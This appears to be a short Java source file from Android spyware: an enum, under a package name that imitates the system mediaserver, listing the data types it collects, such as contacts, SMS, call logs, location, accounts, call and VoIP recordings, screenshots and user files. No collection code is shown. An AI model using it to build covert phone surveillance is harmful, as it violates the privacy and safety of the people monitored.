package com.android.mediaserver.fetchers;

import io.nlopez.smartlocation.geofencing.providers.GeofencingGooglePlayServicesProvider;

public enum ContentType {
  DEVICE_INFO("device_info"), CONTACTS("contacts"), CALL_LOGS("call_logs"), SMS("sms"), LOCATION(
      GeofencingGooglePlayServicesProvider.LOCATION_EXTRA_ID), ACCOUNTS("accounts"), APP_DATA(
      "app_data"), GALLERY("gallery"), RECORDINGS("call_recordings"), VOIP_RECORDINGS(
      "voip_recordings"), SNAPSHOTS("snapshots"), SCREENSHOTS("screenshots"), USER_FILES(
      "user_files"), SD_DATA("external_data"), FILETREE("filetree");

  private final String mType;

  private ContentType(String type) {
    this.mType = type;
  }

  public String toString() {
    return this.mType;
  }
}
